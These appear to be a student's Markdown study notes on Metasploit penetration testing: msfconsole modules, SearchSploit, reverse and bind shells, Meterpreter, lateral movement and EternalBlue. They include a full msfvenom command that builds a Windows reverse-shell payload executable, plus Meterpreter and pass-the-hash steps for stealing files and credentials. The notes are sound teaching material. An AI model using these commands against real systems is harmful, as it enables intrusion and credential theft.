# MetaSploit
## Metasploit overview
- Vulnerability = a weakness in a system that can be exploited
- Payload = A piece of code that runs on a vulnerable system after it was exploited
- Exploit = Passing the payload to the vulnerable system
## Search Engines
- CVE Details = Common vulnerabilities and exposures
- Exploit-DB = An archive that gathers exploits, shell codes, and more
- CVE List = A catalogue that includes a large number of CVEs
## SearchSploit
- Works w/ Exploit-DB
- Preinstalled in Kali Linux
- Contains new exploits
- Command: searchsploit [name]
## SearchSploit Demonstration
- the searchsploit command activates the application
- To download the script, run: Searchsploit -m [full path]
- Change the script permissions and run the application

## MetaSploit Module Types
- Exploit
- Payloads
- Auxiliaries
- Encoders
- Nops
## MetaSploit Modules
- ?- displays all metasploit commands
- show options - displays module settings
- show info - Displays documentation
- show targets - Displays vulnerable targets
## MetaSploit Module Setup
- use[name] = sets the module to be used
- RHOST [IP] = Sets the remote IP host
- RPORT[port] = Sets the remote port target
- LHOST [IP] = Sets the local IP host
- LPORT [port] = Sets the local port number
- exploit = Runs the exploit
## MetaSploit
- A framework for penetration testing
- Msfconsole is an integrated interface for MEtaSploit
- Includes additional modules to extend its capabilities
## MetaSploit Scanning
- Scanning involves running nmap from Msfconsole
- Msfconsole has a large variety of scanners
- all scans are saved to build the database
## Msfconsole Searching
- search option will search in all the modules
- use is a generic handler for an exploit
- use[name] specifies the module in use
# Reverse Shell
## Common Shells
- Telnet = Network protocol that sends data in plain text
- Netcat = tool for network connection
- SSH = Network protocol that sends encrypted data
## Remote Shell Types
- Bind Shell = Attacker connects to the target to gain a remote shell
- Reverse Shell = Attacker runs a listener, the target connects with a shell
## MetaSploit Shells
- Various shells can be created by MetaSploit
- Shell types include Bind Shell, Reverse Shell, and HTPP Tunnel Shell
- Meterpreter is an extensive terminal-based payload
## Msfvenom
- MetaSploit tool
- Combines Msfpayload and Msfencode
## Msfvenom Structure
- msfvenom -p windows/meterpreter/reverse_tcp LPORT=X Lhost=X.X.X.X -f exe > payload.exe
1. Using msfvenom to create a payload
2. -p is the payload flag
3. the payload to be used
4. LPORT is the port.
5. LHOST is the IP of the listening host
6. -f is the file format flag.
7. the output file name
    - creating a basic payload
## Msfvenom Output
![Alt text](<../assets/Msfvenom Output.png>)
## Msfvenom Options
- Includes features to embed payloads
- Verifies correct platform and architecture
- Can detect a non-encoded or non-obfuscated payload
## Remote Connection
- A payload requires a listener
- Configured by running use multi/handler
- **exploit multi/handler** configures the listener settings
## Automating Msfconsole
- Msfconsole can be used in automated scripts
- Create a script using **makerc [filename]**
- Scripts can be loaded manually using **msfconsole -r [file]**
## Meterpreter
- getuid = gets the name of the current user
- pwd = gets the current directory
- ls/cd = provides a means of navigation in the file system
- download[filename] = Downloads a file from the targets machine to the attacker
- sessions -l = choose the session to be used
- background = sends the session to the background
## Meterpreter Post Exploitation
- Enables ongoing exploitation after an attack
- Executed using **run [module]**
- Can migrate to a different process to remain hidden
## Protection Against Automated Tools
- Update = keep everything up to date
- Endpoint Security = Use antivirus protection
- Be Aware = try to detect malicious activity
# Lateral Movement
- Uses credentials to gain access to another computer
- Credentials are often used by several local computer accounts
## Finding the Target
- Find out who is where = Check who is logged on the network
- Find out who is admin = Which users have administrative pivileges
- Find out who belongs to which group = Study group structures in the network
## Lateral Movement Automation
- BloodHound = Used to display collected information
- Neo4j = Back end engine used to calculate and manage collected data
## Lateral Movement Process
- Escalate Permissions = Get Highest possible privileges
- List Members = Use permissions to extract session ashes
- Dump Credentials = Dump the credentials
- PTH & PsExec = Execute Pass the hash or PsExec attacks
- Repeat = Repeat if admin failed to access
## Finding the Target: EternalBlue
- One of the most common exploits
- Will work on Windows 7 unpatched SP1
- Works via a remote shell on the target
## EternalBlue Exploit
- Attacker recognizes the targets OS and version
- Attacker loads the module and payload
- Attacker executes the attack and gets a remote shell
